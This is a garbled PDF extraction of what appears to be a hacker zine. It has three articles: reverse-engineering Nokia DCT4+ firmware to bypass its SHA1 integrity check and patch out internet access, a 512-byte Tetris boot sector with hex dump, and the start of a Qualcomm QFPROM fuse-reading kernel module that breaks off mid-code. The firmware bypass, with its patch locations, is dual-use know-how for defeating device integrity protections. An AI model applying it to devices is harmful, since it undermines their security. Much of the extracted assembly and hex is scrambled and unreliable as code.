lots of small pieces of information from many forum posts in order to get a full solution. Well, not anymore,
because I’m going to present here that solution in all of its glory.
–——–
———
—–—–
———
–—–
——–
—
––—–
———
A DCT4+ phone has two regions of executable code, a flashable part and a non-flashable secured part,
which is most likely mask ROM. The flashable memory contains a number of important regions.
• The Operating System, which Nokia calls the MCUSW. (Read on to learn how they came up with this
name.)
• Strings and localization strings, which Nokia calls the PPM.
• General purpose file system in a FAT16 format. This part contains configuration files, user files,
pictures, ringtones, and more. This is where Nokia puts phone provider customizations, and this part
is a lot less protected. It is usually referred to as the CNT or IMAGE.
All of this data is accessible for the software as one flat memory module, meaning
that code that runs on the device can access almost anything that it knows how to
locate.
At this point I focused on the operating system, in my attempt to patch it to
make the phone Kosher. The operating system contains nearly all of the code that
operates the phone, including the user interface, menus, web browser, SMS, and
anything else the phone does. The only things that are not part of the OS are the
code for performing the flashing, the code for protecting the flash, and some of the
baseband code. These are all found in the ROM part. The CNT part contains only
third party apps, such as games.
Obtaining a copy of the firmware is not hard. It’s available for download from
many websites, and also directly from Nokia’s own servers. These firmware images
can be flashed using Nokia’s flashing tool, Phoenix Service Software, or with Navi-
Firm+. The operating system portion comes with a .mcu or .mcusw extension, which
stands for MicroController Unit SoftWare.
This file starts with the byte 0xA2 that marks the version of the file. The is a
simple Tag-Length-Value format. From offset 0xE6 everything that follows is encoded
as follows:
• 1 Byte: Type, which is always 0x14.
• 1 Dword: Address
• 3 Bytes: Length
• 1 Byte: Unknown
• 1 Byte: Xor checksum
23
0x0084_0000
Secured Rom
0x0090_0000
0x0100_0000
MCUSW
and PPM
0x01CE_0000
0x0218_0000
Image
0x02FC_0000
0x0300_0000
External RAM
0x0400_0000
0x0500_0000
API RAM
0x0510_0000Combining all of the data chunks, starting at the address 0x100_0000 we’ll see something like this:
Offset(h)
0000_0000
0000_0010
0000_0020
0000_0030
0000_0040
0000_0050
0000_0060
0000_0070
0000_0080
00
AD
42
FF
FF
FF
FF
FF
85
00
01
7E
30
FF
FF
FF
FF
FF
CF
00
02
B6
95
FF
FF
FF
FF
FF
C6
00
03
1A
44
FF
FF
FF
FF
FF
E7
00
04
1B
99
F8
FF
FF
FF
FF
00
05
BE
18
1F
FF
FF
FF
FF
04
06
0B
18
8B
FF
FF
FF
FF
8A
07
E2
38
22
FF
FF
FF
FF
5F
08
7D
DB
50
FF
FF
FF
FF
01
09
58
00
65
FF
FF
FF
FF
00
0A
6B
FF
61
FF
FF
FF
FF
01
0B
E4
FF
4B
FF
FF
FF
FF
00
0C
DB
FF
FF
FF
FF
FF
F8
00
0D
EE
FF
FF
FF
FF
FF
C4
00
0E
65
FF
FF
FF
FF
FF
AA
00
0F
14
FF
FF
FF
FF
FF
C3
00
Note that some of these 0xFF bytes are just missing data because of the way it is encoded. The first
data chunk belongs to address 0x0100_0000, but it’s just 0x2C bytes long, and the next data chunk starts
at 0x0100_0064. The data that follows byte 0x0100_0084 is encrypted, and is auto decrypted by hardware.
I know that decryption is done at the hardware level, because I can sniff to see what bytes are actually sent
to the phone during flashing. Further, there are a few places in memory, such as the bytes from 0x0100_0000
to 0x0100_0084, that are not encrypted. After I managed to analyze the encryption, I later found that in
some places in the code these bytes are accessed simply by adding 0x0800_0000 to the address, which is a
flag to the CPU that says that this data is not encrypted, so it shouldn’t be decrypted.
Now an interesting question that comes next is what the encryption is, and how I can reverse it to patch
the code. My answer is going to disappoint you, but I found out how the encryption works by gluing together
pieces of information that are published on the Internet.
If you wonder how the fine folks on the Internet found the encryption, I’m wondering the same thing.
Perhaps someone leaked it from Nokia, or perhaps it was reverse engineered from the silicon. It’s possible,
but unlikely, that the encryption was implemented in ARM code in the unflashable region of memory, then
recovered by a method that I’ll explain later in this article.
It’s also possible that the encryption was reversed mathematically from samples. I think the mechanism
has a problem in that some plaintext, when repeated in the same pattern and at the same distance from
each other, is encrypted to the same ciphertext.
–——–
———
—–—–
———
–—–
——–
—
––—–
———
The ROM contains a rather small amount of code, but as it isn’t included in the firmware updates, I
don’t have a copy. The only thing I care about from this code is how the first megabyte of MCU code is
validated. If and only if that validation succeeds, the baseband is activated to begin GSM communications.
If something in the first megabyte of the MCU code were patched, the validation found in the ROM would
fail, and the phone would refuse to communicate with anything. This won’t interrupt anything else, as the
phone would still need to boot in order to display an appropriate error message. The validation function in
the ROM is invoked from the MCU code, so that function call could be patched out, but again, the GSM
baseband would not be activated, and the phone wouldn’t be able to make any calls. It might sound as if this
is what the customer is looking for, but it’s not, as phone calls are still Kosher six days a week. Note that
Bluetooth still works when baseband doesn’t, and can be a handy communication channel for diagnostics.
Another validation found in the MCU code is a common 16 bit checksum, which is done not for security
reasons but rather to check the phone’s flash memory for corruption. The right checksum value is found
somewhere in the first 0x100 bytes of the MCU. This checksum is easily fixed with any hex editor. If the
check fails, the phone will show a “Contact Service” message, then shut down.
At this point I didn’t know much about what kind of validation is performed on the first megabyte, but
I had a number of samples of official firmware that pass the validation. Every sample has a function that
resides in that megabyte of code and validates the rest of the code. If that function fails, meaning that I
patched something in the code coming after the first megabyte, it immediately reboots the phone. The funny
thing is that the CPU is so slow that I can get a few seconds to play with the phone before the reboot takes
place. Unfortunately, patching out this check still leaves me with no baseband, and thus no product.
24Offset(h)
0000_0000
0000_0010
0000_0020
0000_0030
0000_0040
0000_0050
0000_0060
0000_0070
0000_0080
0000_0090
0000_00A0
0000_00B0
0000_00C0
0000_00D0
0000_00E0
0000_00F0
0000_0100
0000_0110
0000_0120
00
AD
00
FF
FF
FF
FF
FF
4A
00
03
00
BB
A4
D4
A8
60
EA
2D
B3
01
7E
00
FF
FF
FF
FF
FF
E4
00
00
00
D3
A3
1C
30
2C
01
CF
C8
02
B6
00
FF
FF
FF
FF
FF
5C
00
00
F1
29
9A
09
B7
5E
FF
20
20
03
1B
00
FF
FF
FF
FF
FF
8F
00
00
EF
98
A5
96
39
7D
BE
20
20
04
23
00
F8
FF
FF
FF
FF
00
FF
00
89
01
BF
AF
34
63
00
20
20
05
10
00
1F
FF
FF
FF
FF
02
FF
04
33
C8
7B
5B
59
17
FE
20
20
06
03
00
AA
FF
FF
FF
FF
00
FF
CC
EB
BC
27
F2
13
56
6A
6A
6A
07
40
00
02
FF
FF
FF
FF
00
FF
A2
2D
B0
5A
05
7D
C4
84
01
01
08
C6
00
50
FF
FF
FF
FF
01
FF
00
1F
06
E6
20
E7
9F
EA
9D
A5
09
05
00
65
FF
FF
FF
FF
00
FF
04
09
6E
C7
92
BD
6C
50
7C
C2
0A
E4
00
61
FF
FF
FF
FF
01
FF
CC
3B
A8
61
49
72
C5
20
20
20
0B
01
FF
4B
FF
FF
FF
FF
00
FF
A3
DA
11
2D
DF
3F
1A
20
20
20
0C
20
FF
FF
FF
FF
FF
C0
00
01
FF
C7
0E
F7
D5
C7
01
20
20
20
0D
A2
FF
FF
FF
FF
FF
52
00
CE
FF
C0
D1
B8
0B
CF
BF
20
20
20
0E
00
FF
FF
FF
FF
FF
90
00
00
FF
3D
69
70
FC
B3
B5
6A
6A
6A
0F
00
FF
FF
FF
FF
FF
D4
00
00
FF
9F
67
9C
DE
5A
CF
04
01
04
16 bit checksum. If this fails, the phone shows “Contact Service” message and shuts down.
If changed, the baseband fails to start and the phone shows no signal.
These bytes can be freely changed. They are likely version info and a public key.
–——–
———
—–—–
———
–—–
——–
—
––—–
———
To attack this protection I had to better understand the integrity checks. I didn’t have a dump of the
code that checks the first megabyte, so I reversed the check performed on the rest of the binary in an attempt
to find some mistake. Using the FindCrypt IDA script, I found a few implementations of SHA1, MD5, and
other hashing functions that could be used—and should be used!—to check binary integrity.
Most importantly, I found a function that takes arguments of the hash type, data’s starting address, and
length, and returns a digest of that data. Following the cross references of that function brought me to the
following code:
FLASH: 0 1 0 8 6 2 6 6
FLASH: 0 1 0 8 6 2 6 6
FLASH: 0 1 0 8 6 2 6 6
FLASH: 0 1 0 8 6 2 6 8
FLASH: 0 1 0 8 6 2 6A
FLASH: 0 1 0 8 6 2 6C
FLASH: 0 1 0 8 6 2 6E
FLASH: 0 1 0 8 6 2 7 0
FLASH: 0 1 0 8 6 2 7 2
FLASH: 0 1 0 8 6 2 7 4
FLASH: 0 1 0 8 6 2 7 6
FLASH: 0 1 0 8 6 2 7 8
FLASH: 0 1 0 8 6 2 7 8
FLASH: 0 1 0 8 6 2 7A
FLASH: 0 1 0 8 6 2 7C
FLASH: 0 1 0 8 6 2 7E
FLASH: 0 1 0 8 6 2 7E
FLASH: 0 1 0 8 6 2 8 0
FLASH: 0 1 0 8 6 2 8 2
FLASH: 0 1 0 8 6 2 8 4
FLASH: 0 1 0 8 6 2 8 6
FLASH: 0 1 0 8 6 2 8 6
FLASH: 0 1 0 8 6 2 8 8
loc_1086266
; CODE XREF: SHA1_check+1F6
; SHA1_check+1FC
LDR
MOVS
LDRB
MULS
LDR
SUBS
ADDS
MOVS
ADDS
R2 ,
R1 ,
R0 ,
R1 ,
R0 ,
R0 ,
R0 ,
R4 ,
R0 ,
=0x300C8D2
#0x1C
[ R2 , R0 ]
R0
=SHA1_check_related
#0x80
R1 , R0
R0
#0x80
R1 = S t a r t
LDR
R1 , [ R0,#0xC ]
LDR
R2 , [ R0,#0 x10 ]
LDR
R0 , [ R0,#0xC ]
DataLength = D a t a S t a r t − DataEnd ;
SUBS
R3 , R2 , R0
ADD
R2 , SP , #0x38+hashLength
STR
R2 , [ SP,#0 x38+hashLengthCopy ]
LDRB
R0 , [ R6, # 8 ]
DataLength += 1 ;
ADDS
R3 , R3 , #1
ADDS
R7 , R7 , R3
25FLASH: 0 1 0 8 6 2 8A R2 = DataLength ;
FLASH: 0 1 0 8 6 2 8A
MOVS
FLASH: 0 1 0 8 6 2 8C
ADD
FLASH: 0 1 0 8 6 2 8E
BL
FLASH: 0 1 0 8 6 2 8E
FLASH: 0 1 0 8 6 2 9 2
CMP
FLASH: 0 1 0 8 6 2 9 4
BNE
FLASH: 0 1 0 8 6 2 9 4
FLASH: 0 1 0 8 6 2 9 6
LDR
FLASH: 0 1 0 8 6 2 9 8
MOVS
FLASH: 0 1 0 8 6 2 9A
BL
FLASH: 0 1 0 8 6 2 9A
FLASH: 0 1 0 8 6 2 9E
MOVS
FLASH: 0 1 0 8 6 2 A0
BL
R2 , R3
R3 , SP , #0x38+hashToCompare
hashInitUpdateNDigest_j
R0 , #0
loc_10862A4
R0 , =hashRelatedVar
R1 , #1
MONServerRelated_over1
R0 , #4
reset
The digest function is hashInitUpdateNDigest_j, of course. The SHA1_check_related address had the
following data in it:
FLASH: 0 1 0 8 9DD4
FLASH: 0 1 0 8 9DD4
FLASH: 0 1 0 8 9DD8
FLASH: 0 1 0 8 9DDC
FLASH: 0 1 0 8 9DE0
FLASH: 0 1 0 8 9DE0
FLASH: 0 1 0 8 9DE4
FLASH: 0 1 0 8 9DE8
FLASH: 0 1 0 8 9DEC
FLASH: 0 1 0 8 9DF0
FLASH: 0 1 0 8 9DF4
FLASH: 0 1 0 8 9DF8
FLASH: 0 1 0 8 9DFC
FLASH: 0 1 0 8 9DFC
FLASH: 0 1 0 8 9 E00
FLASH: 0 1 0 8 9 E04
FLASH: 0 1 0 8 9 E08
FLASH: 0 1 0 8 9E0C
FLASH: 0 1 0 8 9 E10
FLASH: 0 1 0 8 9 E14
FLASH: 0 1 0 8 9 E18
FLASH: 0 1 0 8 9 E18
FLASH: 0 1 0 8 9E1C
FLASH: 0 1 0 8 9 E20
FLASH: 0 1 0 8 9 E24
FLASH: 0 1 0 8 9 E28
FLASH: 0 1 0 8 9E2C
FLASH: 0 1 0 8 9 E30
FLASH: 0 1 0 8 9 E34
FLASH: 0 1 0 8 9 E34
FLASH: 0 1 0 8 9 E38
FLASH: 0 1 0 8 9E3C
FLASH: 0 1 0 8 9 E40
FLASH: 0 1 0 8 9 E44
FLASH: 0 1 0 8 9 E48
FLASH: 0 1 0 8 9E4C
FLASH: 0 1 0 8 9 E50
FLASH: 0 1 0 8 9 E54
SHA1_check_related DCD 0 xB5213665
DCD
SHA1_check_info DCD
#1
DCD
DCD
DCD
DCD
DCD
DCD
DCD
#2
DCD
DCD
DCD
DCD
DCD
DCD
DCD
#3
DCD
DCD
DCD
DCD
DCD
DCD
DCD
#4
DCD
DCD
DCD
DCD
DCD
DCD
DCD
DCD
DCD
; DATA XREF: SHA1_check : loc_108616A
; SHA1_check+9E . . .
3
0x200400AA ; DATA XREF: SHA1_check+44
loc_1100100
loc_13AFFFE+1
0xEE41347A
0x8C88F02F
0x563BB973
0 x040E1233
0x8C03AFFA ;
;
;
;
;
;
;
Start
End
\
\
= SHA1SUM
/
/
loc_13B0000
loc_165FFFE+1
0xCC29F881
0xA441D8CD
0x7CEF5FEF
0xC35FE703
0x8BD3D4D6
loc_1660000
loc_190FFFC+3
0 x77439E9B
0 x530F0029
0xA7490D5B
0 x4E621094
0xC7844FE3
loc_1910000
dword_1BFB5C8+7
0xA87ABFB7
0xFB44D95E
0xC3E95DCA
0xE190ECCA
0 x9D100390
0
0
This is SHA1 digest of other arrays of binary, in chunks of about 0x002B_0000 bytes. All of the data
26from 0x0100_0100 to 0x0110_0100 is protected by the ROM. The data from 0x0110_0100 to 0x013A_FFFF
digest to EE41347A8C88F02F563BB973040E12338C03AFFA under SHA1. So I guessed that this function is
the validation function that uses SHA1 to check the rest of the binary.
Later on in the same function I found the following code.
FLASH: 0 1 0 8 6 2 E0
FLASH: 0 1 0 8 6 2 E0
FLASH: 0 1 0 8 6 2 E0
FLASH: 0 1 0 8 6 2 E0
FLASH: 0 1 0 8 6 2 E2
FLASH: 0 1 0 8 6 2 E4
FLASH: 0 1 0 8 6 2 E6
FLASH: 0 1 0 8 6 2 E8
FLASH: 0 1 0 8 6 2EA
FLASH: 0 1 0 8 6 2EA
FLASH: 0 1 0 8 6 2EA
FLASH: 0 1 0 8 6 2EA
FLASH: 0 1 0 8 6 2EC
FLASH: 0 1 0 8 6 2EC
FLASH: 0 1 0 8 6 2EE
FLASH: 0 1 0 8 6 2EE
FLASH: 0 1 0 8 6 2 F0
FLASH: 0 1 0 8 6 2 F0
FLASH: 0 1 0 8 6 2 F0
FLASH: 0 1 0 8 6 2 F0
FLASH: 0 1 0 8 6 2 F2
FLASH: 0 1 0 8 6 2 F2
FLASH: 0 1 0 8 6 2 F2
FLASH: 0 1 0 8 6 2 F4
FLASH: 0 1 0 8 6 2 F4
FLASH: 0 1 0 8 6 2 F4
FLASH: 0 1 0 8 6 2 F6
FLASH: 0 1 0 8 6 2 F8
FLASH: 0 1 0 8 6 2 F8
FLASH: 0 1 0 8 6 2 F8
FLASH: 0 1 0 8 6 2 F8
FLASH: 0 1 0 8 6 2FA
FLASH: 0 1 0 8 6 2FC
FLASH: 0 1 0 8 6 2FC
FLASH: 0 1 0 8 6 3 0 0
FLASH: 0 1 0 8 6 3 0 2
FLASH: 0 1 0 8 6 3 0 2
FLASH: 0 1 0 8 6 3 0 6
f o r ( i = 0 ; i < hashLength ; ++i ) {
loc_10862E0
; CODE XREF: SHA1_check+1CC
ADDS
R3 , R4 , R0
ADDS
R3 , #0x80
ADD
R2 , SP , #0x38+hashToCompare
LDRB
R2 , [ R2 , R0 ]
LDRB
R3 , [ R3,#0 x14 ]
i f ( hash [ i ] != hashToCompare [ i ] ) {
return False ;
}
CMP
R2 , R3
BEQ
loc_10862F0
MOVS R5 , #1
ADDS R0 , R0 , #1
CMP R0 , R1
BCC loc_10862E0
loc_10862F0
; CODE XREF: SHA1_check+1C4
loop
; CODE XREF: SHA1_check+1B6
}
CMP
R5 , #1
// Patch h e r e t o 0 xe006
BNE loc_1086308
LDR
BL R0 , =0x7D0005
HashMismatch
MOVS
BL R0 , #4
reset
B loc_1086310
This function performs the comparison of the calculated hash to the one in the table, and, should that
fail to match, it calls the HashMismatch() function and then the reset function with Error Code 4.
The HashMismatch() function looks a bit like this.
FLASH: 0 1 0 8 5 3 2 0
FLASH: 0 1 0 8 5 3 2 0
FLASH: 0 1 0 8 5 3 2 0
FLASH: 0 1 0 8 5 3 2 0
FLASH: 0 1 0 8 5 3 2 0
FLASH: 0 1 0 8 5 3 2 0
FLASH: 0 1 0 8 5 3 2 0
FLASH: 0 1 0 8 5 3 2 2
FLASH: 0 1 0 8 5 3 2 2
; A t t r i b u t e s : thunk
HashMismatch
; CODE XREF: sub_1084232+38
; sub_1085B6C+6C . . .
BX
PC
; −−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−
ALIGN 4
; End o f f u n c t i o n HashMismatch
27FLASH: 0 1 0 8 5 3 2 2
FLASH: 0 1 0 8 5 3 2 4
FLASH: 0 1 0 8 5 3 2 4
FLASH: 0 1 0 8 5 3 2 4
FLASH: 0 1 0 8 5 3 2 4
FLASH: 0 1 0 8 5 3 2 4
FLASH: 0 1 0 8 5 3 2 4
FLASH: 0 1 0 8 5 3 2 4
FLASH: 0 1 0 8 5 3 2 8
FLASH: 0 1 0 8 5 3 2 8
FLASH: 0 1 0 8 5 3 2 8
FLASH: 0 1 0 8 5 3 2 8
FLASH: 0 1 0 8 5 3 2 8
FLASH: 0 1 0 8 5 3 2C
FLASH: 0 1 0 8 5 3 3 0
FLASH: 0 1 0 8 5 3 3 0
FLASH: 0 1 0 8 5 3 3 0
FLASH: 0 1 0 8 5 3 3 0
FLASH: 0 1 0 8 5 3 3 0
FLASH: 0 1 0 8 5 3 3 0
FLASH: 0 1 0 8 5 3 3 0
FLASH: 0 1 0 8 5 3 3 0
FLASH: 0 1 0 8 5 3 3 0
FLASH: 0 1 0 8 5 3 3 0
FLASH: 0 1 0 8 5 3 3 0
FLASH: 0 1 0 8 5 3 3 2
FLASH: 0 1 0 8 5 3 3 2
FLASH: 0 1 0 8 5 3 3 2
FLASH: 0 1 0 8 5 3 3 4
CODE32
; =============== S U B R O U T I N E =======================================
sub_1085324
LDR
BX
; CODE XREF: HashMismatch
R12 , =(sub_1453178 +1)
R12 ; sub_1453178
; End o f f u n c t i o n sub_1085324
; −−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−
off_108532C
DCD sub_1453178+1
; DATA XREF: sub_1085324
CODE16
; =============== S U B R O U T I N E =======================================
; A t t r i b u t e s : thunk
sub_1085330
; CODE XREF: sub_10836E6+86
; sub_10874BA+3C . . .
BX
PC
; −−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−
ALIGN 4
; End o f f u n c t i o n sub_1085330
CODE32
Please recall that ARM has two different instruction sets, the 32-bit wide ARM instructions and the
more efficient, but less powerful, variable-length Thumb instructions. Then note that ARM code is used for
a far jump, which Thumb cannot do directly.
Therefore what I have is code that is secured and is well checked by the ROM, which implements a SHA1
hash on the rest of the code. When the check fails, it uses the code that it just failed to verify to alert the
user that there is a problem with the binary! It’s right there at 0x0145_3178, in the fifth megabyte of the
binary.
From here writing a bypass was as simple as writing a small patch that fixes the Binary Mismatch flag
and jumps back to place right after the check. Ain’t that clever?
How could such a vulnerability happen to a big company like Nokia? Well, beyond speculation, it’s a
common problem that high level programmers don’t pay attention to the lower layers of abstraction. Perhaps
the linking scripts weren’t carefully reviewed, or they were changed after the secure bootloader was written.
It could be that they really wanted to give the user some indication about the problem, or that they had
to invoke some cleanup function before shutdown, and by mistake, the relevant code was in another library
that got linked into higher addresses, and no one thought about it.
Anyhow, this is my favorite method for patching the flash. It doesn’t allow me to patch the first megabyte
directly, but I can accomplish all that I need by patching the later megabytes of firmware.
However, if that’s not enough, some neighbors reversed the first megabyte check for some of the phones
and made it public. Alas, the function they published is only good for some modules, and not for the entire
series.
How did they manage to do it, you ask? Well, it’s possible that it was silicon reverse engineering, but
another method is rumored to exist. The rumor has it that with JTAG debugging, one could single-step
through the program and spy on the Instruction Fetch stage of the pipeline in order to recover the instructions
from mask ROM. Replacing those instructions with a NOP before they reach the WriteBack stage of the
28pipeline would linearize the code and allow the entire ROM to be read by the debugger while the CPU sees
it as one long NOP sled. As I’ve not tried this technique myself, I’d appreciate any concrete details on how
exactly it might be done.
–——–
———
—–—–
———
–—–
——–
—
––—–
———
Now that I had a way to patch the firmware, I could go on to creating a patched version to make this
phone Kosher. I had to reverse the menu functions entirely, which was quite a pain. I also had to reverse
the methods for loading strings in order to have a better way to find my way around this big binary file.
Some of the patching was a bit smoother than others. For instance, after removing Internet options from
all of the menus, I wanted to be extra careful in case I missed a secret menu option.
To disable the Internet access, one might suggest searching for the TCP implementation, but that would
be too much work, and as a side effect it might harm IPC. One can also suggest searching for things like the
default gateway and set it to something that would never work, but again that would be too much work. So
I searched for all the places where the word “GET” in all capitals was found in the binary. Luckily I had
just one match, and I patched it to “BET”, so from now on, no standard HTTP server would ever answer
requests. Moreover, to be on the extra, extra safe side I’ve also patched “POST” to “MOST”. Lets see them
downloading porn with that!
Be sure to read my next article for some fancy tricks involving the filesystem of the phone.
298
Tetranglix: This Tetris is a Boot Sector
by Juhani Haverinen, Owen Shepherd, and Shikhin Sethi
Since Dakarand in a 512-byte boot sector would have been too easy, and
since both Tetris and 512-byte boot sectors are the perfect ingredients to a
fun evening, the residents of #osdev-offtopic on FreeNode took to writing
a Tetris clone in the minimum number of bytes possible. This tetris game
is available by unzipping this PDF file, through Github, 6 by typing the hex
from page 32, or by scanning the barcode on page 31.
There’s no fun doing anything without a good challenge. This project
presented plenty, a few of which are described in this article.
To store each tetramino, we used 32-bit words as bitmaps. Each
tetramino, at most, needed a 4 by 4 array for representation, which could
easily be flatenned into bitmaps.
; All tetraminos in bitmap format.
tetraminos:
dw 0b0000111100000000
; I
dw 0b0000111000100000
; J
dw 0b0000001011100000
; L
dw 0b0000011001100000
; O
dw 0b0000001101100000
; S
dw 0b0000111001000000
; T
dw 0b0000011000110000
; Z
-Z-- -S-- -O--
0000
0110
0011
0000 0000
0011
0110
0000 0000
0110
0110
0000
Instead of doing bound checks on the current position of the tetramino, to ensure the user can’t move it
out of the stack, we simply restricted the movement by putting two-block wide boundaries on the playing
stack. The same also added to the esthetic appeal of the game.
To randomly determine the next tetramino to load, our implementation also features a Dakarand-style
random number generator between the RTC and the timestamp counter.
; Get random number in AX.
rdtsc
xor ax, dx
; The timestamp counter.
; (INTERMEDIATE CODE)
; Yayy, more random.
add ax, [0x046C]
; And the RTC (updated via BIOS).
The timestamp counter also depends on how much input the user provided. In this way, we ensure that
the user adds to the entropy by playing the game.
Apart from such obvious optimizations, many nifty tricks ensure a minimal byte count, and these are
what make our Tetranglix code worth reading. For example, the same utility function is used both to blit
the tetramino onto the stack and to check for collision. Further optimization is achieved by depending upon
the results of BIOS calls and aggressive use of inlining.
While making our early attempts, it looked impossible to fit everything in 512 bytes. In such moments of
desperation, we attempted compression with a simplified variant of LZSS. The decompressor clocked at 41
bytes, but the compressor was only able to reduce the code by 4 bytes! We then tried LZW, which, although
saved 21 bytes, required an even more complicated decompression routine. In the end, we managed to make
our code dense enough that no compression was necessary.
6 https://github.com/Shikhin/tetranglix
30Since the project was written to meet a strict deadline, we couldn’t spend more time on optimization
and improvement. Several corners had to be cut.
The event loop is designed such that it waits for the entirety of two PIT (programmable interval timer)
ticks—109.8508mS–—before checking for user input. This creates a minor lag in the user interface, something
that could be improved with a bit more effort.
Several utility functions were first written, then inlined. These could be rewritten to coexist more
peacefully, saving some more space.
As a challenge, the authors invite clever readers to clean up the event loop, and with those bytes shaved
off, to add support for scoring. A more serious challenge would be to write a decompression routine that
justifies its existence by saving more bytes than it consumes.
; IT’S A SECRET TO EVERYBODY.
db "ShNoXgSo"
31Offset(h)
0000_0000
0000_0010
0000_0020
0000_0030
0000_0040
0000_0050
0000_0060
0000_0070
0000_0080
0000_0090
0000_00a0
0000_00b0
0000_00c0
0000_00d0
0000_00e0
0000_00f0
0000_0100
0000_0110
0000_0120
0000_0130
0000_0140
0000_0150
0000_0160
0000_0170
0000_0180
0000_0190
0000_01a0
0000_01b0
0000_01c0
0000_01d0
0000_01e0
0000_01f0
00
ea
fc
26
07
89
d2
1e
31
9f
0f
b4
06
72
04
fe
07
44
99
c0
83
07
aa
60
01
c9
c7
b1
f1
61
83
78
60
01
05
bf
b0
b8
44
be
6c
d2
e8
42
01
fe
3b
05
ca
61
01
7d
0f
ee
61
47
8a
c7
ac
90
10
83
c3
c4
06
03
02
7c
04
03
00
fd
24
04
03
7d
c6
cd
0c
80
b9
75
e2
ff
e8
44
10
e9
aa
44
d1
84
00
84
c7
3c
12
01
40
03
00
05
fe
0f
89
05
75
06
bf
88
16
ff
fc
04
f8
d7
d7
87
da
f3
f1
47
01
e7
c0
eb
c9
0c
db
f9
c7
0e
04
00
b9
c4
f3
44
bf
fa
6c
04
05
74
d7
48
00
e2
ff
73
00
fe
a4
fe
e2
b1
b1
26
e6
74
eb
75
c3
be
30
05
31
b6
cd
ab
01
b8
84
04
05
47
59
72
75
bf
ef
d7
3f
31
ca
61
60
f9
50
10
0f
61
10
ec
0e
0f
04
06
06
db
01
10
be
83
7d
d2
b9
be
e2
30
46
38
13
be
73
fe
c9
75
fc
bf
83
f6
be
44
e9
fe
61
81
b6
05
53
07
8e
31
b8
2a
c6
fb
75
07
db
f4
e4
80
31
05
14
07
4c
be
f6
83
30
c7
e1
04
05
bf
c9
c3
ff
44
c3
68
08
d3
c0
00
05
10
8b
37
00
00
61
cd
fc
c9
01
05
b9
01
2a
84
c1
00
60
0f
05
ab
fe
ac
60
ba
01
00
4e
09
bc
f3
b8
66
81
1e
fe
f7
b9
c7
16
4d
fe
cf
bf
03
30
05
db
10
be
81
b6
b4
ab
08
ff
f8
06
c1
0f
6f
This is a complete Tetris game.
32
0A
00
aa
8e
b8
fe
6c
c2
f1
10
04
8b
75
c1
b2
04
00
d2
b2
75
81
2a
ff
3c
0f
f6
05
d2
ba
73
e0
20
58
0B
7c
b0
c0
db
ba
04
60
89
00
06
1c
06
60
04
05
eb
60
10
0b
f9
05
a0
d1
84
c1
c3
47
c2
04
04
0e
67
0C
8e
03
31
db
06
83
0f
d3
30
00
80
fe
06
a4
b1
ce
06
30
fd
90
b9
0f
e7
c9
03
60
f6
7d
3a
0f
e0
53
0D
db
cd
ff
db
76
c3
31
d0
c0
e9
fc
04
1e
83
08
89
1e
db
60
01
10
72
83
74
75
e8
c1
e8
05
b6
02
6f
0E
8e
10
b9
db
f0
02
31
e3
d1
a5
4b
ff
07
c7
f3
1c
07
ac
89
72
00
ed
c7
16
ec
35
03
dc
75
1c
60
55
0F
c3
b5
d0
66
30
39
d0
8b
e3
00
75
d7
be
03
a5
fe
ba
84
f7
da
ac
61
18
fe
81
00
75
ff
04
8d
06
aa9
Defusing the Qualcomm Dragon
a short story of research by Josh “m0nk” Thomas
Earlier this year, Nathan Keltner and I started down the curious path of Qualcomm SoC security. The
boot chain in particular piqued my interest, and the lack of documentation doubled it. The following is a
portion of the results. 7
Qualcomm internally utilizes a 16kB bank of one time programmable fuses, which they call QFPROM,
on the Snapdragon S4 Pro SoC (MSM8960) as well as the other related processors. These fuses, though
publicly undocumented, are purported to hold the bulk of inter-chip configuration settings as well as the
cryptographic keys to the device. Analysis of leaked documentation has shown that the fuses contain the
primary hardware keys used to verify the Secure Boot 3.0 process as well as the cryptographic information
used to secure Trust Zone and other security related functionality embedded in the chip. Furthermore, the
fuse bank controls hardwired security paths for Secure Boot functionality, including where on disk to acquire
the bootable images. The 16kB block of fuses also contains space for end user cryptographic key storage and
vendor specific configurations.
These one time programmable fuses are not intended to be directly accessed by the end user of the
device and in some cases, such as the basic cryptographic keys, the Android kernel itself is not allowed to
view the contents of the QFPROM block. These fuses and keys are documented to be hardware locked and
accessible only by very controlled paths. Preliminary research has shown that a previously unknown 4kB
subset of the 16kB block is mapped into the kernel IMEM at physical location 0x0070_0000. The fuses are
also documented to be shadowed at 0x0070_4000 in memory. Furthermore, there exists somewhat unused
source code from the Code Aurora project in the Android kernel that documents how to read and write to
the 4kB block of exposed fuses.
Aside from the Aurora code, many vendors have also created and publicly shared code to play with the
fuses. LG is the best of them, with a handy little kernel module that maps and explores LG specific bitflags.
In general, there is plenty of code available for a clever neighbor to learn the process.
The following are simple excerpts from my tool that should help you explore these fuses with a little
more granularity. Please note, and NOTE WELL, that writing eFuse or QFPROM values can and probably
will brick your device. Be careful!
One last interesting tidbit though, one that will hopefully entice the reader to do something nifty. SoC
and other hardware debugging is typically turned off with a blown fuse, but there exists a secondary fuse
that turns this functionality back on for RMA and similar requests. Also, these fuses hold the blueprint for
where and how Secure Boot 3.0 works as well as where the device should look for binary blobs to load during
setup phases.
//−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−
// B e f o r e we can crawl , we must have appendages
//−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−
s t a t i c i n t map_the_things ( void ) {
uint32_t i ;
u i n t 8 _ t stored_data_temp ;
//−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−
// S t a g e 1 : H i t t i n g t h e eFuse memory d i r e c t l y ( t h i s i s not s u p p o s e d t o work )
//−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−
p r _ i n f o ( "m0nk␣−>␣ and ␣we␣ run ␣ u n t i l ␣we␣ r e a d : ␣%i ␣ l o v e l y ␣ b y t e s \n" , QFPROM_FUSE_BLOB_SIZE ) ;
f o r ( i = 0 ; i < QFPROM_FUSE_BLOB_SIZE; i ++) {
